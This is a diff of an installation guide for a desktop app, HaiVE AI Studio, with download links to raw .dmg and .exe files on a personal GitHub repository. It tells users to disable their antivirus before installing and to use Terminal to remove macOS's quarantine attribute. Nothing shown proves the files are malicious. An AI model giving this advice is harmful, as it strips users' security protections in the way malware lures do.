@@ -1,13 +1,20 @@
 ### HaiVE AI Studio Installation Guide
 
+#### Preliminary Step: Clear Old Installation
+1. **If you already have the app installed**, open it and click the "Reset" button to clear all cache files.
+2. **Remove the old application** from your system.
+3. **Proceed with the new installation**.
+
 #### Step 1: Download the Application
 1. **Click on the link** to download the HaiVE AI Studio application:
-   [Download Link](https://github.com/aivfkesavan/aistudio/raw/main/HaiVE%20AI%20Studio.dmg)
+   - For Mac: [Download Link](https://github.com/aivfkesavan/aistudio/raw/main/HaiVE%20AI%20Studio.dmg)
+   - For Windows: [Windows Download Link](https://github.com/aivfkesavan/aistudio/raw/main/app/HaiVE%20AI%20Studio_1.0.1_x64-setup.exe)
+   - **Note**: Disable your antivirus software before installation to prevent any issues.
 
-#### Step 2: Handling the "Damaged" Error
+#### Step 2: Handling the "Damaged" Error (Mac Only)
 1. **Attempt to open the application**. If you receive a pop-up stating that "HaiVE AI Studio is damaged and can't be opened", follow the next steps.
 
-#### Step 3: Removing Quarantine Attribute
+#### Step 3: Removing Quarantine Attribute (Mac Only)
 1. **Open Terminal** on your Mac.
 2. **Run the following command** to remove the quarantine attribute:
    ```sh
@@ -55,9 +62,3 @@
 2. **Sign up or log in** to your account if you don't already have one.
 3. **Set up the server**. If your local inference is on, you will see the option to connect.
 4. **Click Connect** and proceed to the chat screen to start chatting.
-
-#### For Windows Users
-1. **Download the Windows version** of the HaiVE AI Studio application:
-   [Windows Download Link](https://github.com/aivfkesavan/aistudio/raw/main/app/HaiVE%20AI%20Studio_1.0.1_x64-setup.exe)
-2. **Note**: Disable your antivirus software before installation to prevent any issues.
-
